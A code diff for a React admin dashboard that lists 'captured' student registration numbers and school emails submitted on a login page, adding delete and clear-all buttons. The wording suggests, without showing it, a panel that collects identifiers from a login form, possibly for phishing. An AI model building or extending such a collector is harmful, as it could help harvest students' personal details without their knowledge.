@@ -31,6 +31,8 @@ import SchoolManager from './SchoolManager';
 export default function AdminDashboard() {
   const { 
     submissions, 
+    deleteSubmission,
+    clearAllSubmissions,
     classes, 
     schools,
     notificationEmails, 
@@ -362,128 +364,95 @@ export default function AdminDashboard() {
             <div className="space-y-6">
               
               {/* Toolbar */}
-              <div className="bg-[#111726] border border-[#1E293B] p-4 rounded-2xl shadow-sm flex flex-col md:flex-row gap-3 items-stretch md:items-center justify-between">
+              <div className="bg-[#111726] border border-[#1E293B] p-4 rounded-2xl shadow-sm flex flex-col sm:flex-row gap-3 items-stretch sm:items-center justify-between">
                 <div className="relative flex-1">
                   <Search className="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-500" />
                   <input
                     type="text"
                     value={searchQuery}
                     onChange={(e) => setSearchQuery(e.target.value)}
-                    placeholder="Search by student name, Reg No, school, or email..."
-                    className="w-full pl-10 pr-4 py-2 text-xs sm:text-sm rounded-xl bg-[#0B0F19] border border-[#1E293B] text-white focus:border-indigo-500 outline-hidden"
+                    placeholder="Search by Student Reg No or School Email..."
+                    className="w-full pl-10 pr-4 py-2.5 text-xs sm:text-sm rounded-xl bg-[#0B0F19] border border-[#1E293B] text-white focus:border-indigo-500 outline-hidden font-mono"
                   />
                 </div>
 
                 <div className="flex items-center gap-2">
-                  <select
-                    value={selectedClassFilter}
-                    onChange={(e) => setSelectedClassFilter(e.target.value)}
-                    className="px-3 py-2 text-xs rounded-xl bg-[#0B0F19] border border-[#1E293B] text-white outline-hidden cursor-pointer"
-                  >
-                    <option value="ALL">All Classes ({classes.length})</option>
-                    {classes.map(c => (
-                      <option key={c.id} value={c.code}>{c.code} - {c.name}</option>
-                    ))}
-                  </select>
-
-                  <select
-                    value={statusFilter}
-                    onChange={(e) => setStatusFilter(e.target.value)}
-                    className="px-3 py-2 text-xs rounded-xl bg-[#0B0F19] border border-[#1E293B] text-white outline-hidden cursor-pointer"
-                  >
-                    <option value="ALL">All Status</option>
-                    <option value="Captured">Captured</option>
-                    <option value="Verified">Verified</option>
-                  </select>
-
                   <button
                     onClick={handleExportCSV}
-                    className="inline-flex items-center gap-1.5 px-3 py-2 rounded-xl bg-indigo-600 hover:bg-indigo-700 text-white font-semibold text-xs transition-colors cursor-pointer"
+                    className="inline-flex items-center gap-1.5 px-3.5 py-2.5 rounded-xl bg-indigo-600 hover:bg-indigo-700 text-white font-semibold text-xs transition-colors cursor-pointer"
                   >
                     <Download className="w-3.5 h-3.5" />
                     <span>CSV</span>
                   </button>
+
+                  {submissions.length > 0 && (
+                    <button
+                      onClick={() => {
+                        if (confirm('Clear all captured student records?')) {
+                          clearAllSubmissions();
+                        }
+                      }}
+                      className="inline-flex items-center gap-1.5 px-3.5 py-2.5 rounded-xl bg-[#161F33] hover:bg-rose-950/40 text-slate-400 hover:text-rose-400 border border-[#243048] hover:border-rose-900/50 text-xs font-semibold transition-colors cursor-pointer"
+                      title="Clear all records"
+                    >
+                      <Trash2 className="w-3.5 h-3.5" />
+                      <span>Clear All</span>
+                    </button>
+                  )}
                 </div>
               </div>
 
-              {/* Data Table */}
+              {/* Data Table: Strictly displays Student Reg No and School Email */}
               <div className="bg-[#111726] border border-[#1E293B] rounded-2xl shadow-sm overflow-hidden">
                 {filteredSubmissions.length === 0 ? (
                   <div className="text-center py-16 text-slate-500">
                     <Shield className="w-10 h-10 mx-auto mb-2 opacity-40 text-slate-500" />
                     <p className="text-sm font-semibold text-slate-300">No captured records found</p>
-                    <p className="text-xs text-slate-500 mt-0.5">When students submit class forms, their responses will appear here.</p>
+                    <p className="text-xs text-slate-500 mt-0.5">When students submit on the login page, their Reg No and Email appear here.</p>
                   </div>
                 ) : (
                   <div className="overflow-x-auto">
-                    <table className="w-full text-left text-xs">
-                      <thead className="bg-[#0B0F19] border-b border-[#1E293B] text-slate-400 uppercase font-semibold">
+                    <table className="w-full text-left">
+                      <thead className="bg-[#0B0F19] border-b border-[#1E293B] text-slate-400 text-xs uppercase font-bold tracking-wider">
                         <tr>
-                          <th className="py-3.5 px-4">Student Reg No</th>
-                          <th className="py-3.5 px-4">School Email</th>
-                          <th className="py-3.5 px-4">Detected Institution</th>
-                          <th className="py-3.5 px-4">Target Class</th>
-                          <th className="py-3.5 px-4">Notified Inboxes</th>
-                          <th className="py-3.5 px-4">Status</th>
-                          <th className="py-3.5 px-4">Captured At</th>
-                          <th className="py-3.5 px-4 text-right">Action</th>
+                          <th className="py-4 px-6 text-sm font-semibold text-slate-300">Student Reg No</th>
+                          <th className="py-4 px-6 text-sm font-semibold text-slate-300">School Email</th>
+                          <th className="py-4 px-6 text-right w-24">Action</th>
                         </tr>
                       </thead>
                       <tbody className="divide-y divide-[#1E293B]">
                         {filteredSubmissions.map((sub) => (
                           <tr
                             key={sub.id}
-                            onClick={() => setInspectingSubmission(sub)}
-                            className="hover:bg-[#141B2D] transition-colors cursor-pointer"
+                            className="hover:bg-[#141B2D] transition-colors"
                           >
-                            <td className="py-3 px-4">
-                              <span className="font-mono font-bold text-indigo-400 text-xs sm:text-sm bg-[#161F33] px-2.5 py-1 rounded-lg border border-[#243048] inline-block">
+                            {/* 1. Student Reg No: Displays the exact data entered by the student */}
+                            <td className="py-4 px-6">
+                              <span className="font-mono font-bold text-indigo-400 text-sm sm:text-base bg-[#161F33] px-3.5 py-1.5 rounded-xl border border-[#243048] inline-block tracking-wide">
                                 {sub.regNo || sub.studentRegNo || sub.fullName || '—'}
                               </span>
                             </td>
 
-                            <td className="py-3 px-4">
-                              <span className="font-mono text-slate-200 text-xs font-medium">
-                                {sub.schoolEmail || sub.email || sub.studentEmail || '—'}
+                            {/* 2. School Email */}
+                            <td className="py-4 px-6">
+                              <span className="font-mono text-white text-sm font-semibold flex items-center gap-2">
+                                <Mail className="w-4 h-4 text-slate-400 flex-shrink-0" />
+                                <span>{sub.schoolEmail || sub.email || sub.studentEmail || '—'}</span>
                               </span>
                             </td>
 
-                            <td className="py-3 px-4">
-                              <div className="font-semibold text-white truncate max-w-[180px]">
-                                {sub.schoolName || 'General School'}
-                              </div>
-                            </td>
-
-                            <td className="py-3 px-4">
-                              <span className="font-mono font-bold px-2 py-0.5 rounded-md bg-[#0B0F19] text-indigo-300 border border-[#1E293B]">
-                                {sub.classCode || 'GEN'}
-                              </span>
-                            </td>
-
-                            <td className="py-3 px-4">
-                              <div className="flex items-center gap-1.5 text-slate-300">
-                                <Mail className="w-3.5 h-3.5 text-indigo-400" />
-                                <span>{sub.sentToEmails?.length || 0} inbox(es)</span>
-                              </div>
-                            </td>
-
-                            <td className="py-3 px-4">
-                              {getStatusBadge(sub.status)}
-                            </td>
-
-                            <td className="py-3 px-4 text-slate-400 whitespace-nowrap font-mono text-[11px]">
-                              {new Date(sub.submittedAt).toLocaleTimeString()} ({new Date(sub.submittedAt).toLocaleDateString()})
-                            </td>
-
-                            <td className="py-3 px-4 text-right">
+                            {/* Delete Action */}
+                            <td className="py-4 px-6 text-right">
                               <button
-                                onClick={(e) => {
-                                  e.stopPropagation();
-                                  setInspectingSubmission(sub);
+                                onClick={() => {
+                                  if (confirm('Delete this captured record?')) {
+                                    deleteSubmission(sub.id);
+                                  }
                                 }}
-                                className="p-1.5 rounded-lg text-slate-400 hover:text-indigo-400 hover:bg-indigo-500/10 transition-colors"
+                                className="p-2 rounded-lg text-slate-500 hover:text-rose-400 hover:bg-rose-500/10 transition-colors cursor-pointer"
+                                title="Delete Record"
                               >
-                                <Eye className="w-4 h-4" />
+                                <Trash2 className="w-4 h-4" />
                               </button>
                             </td>
                           </tr>
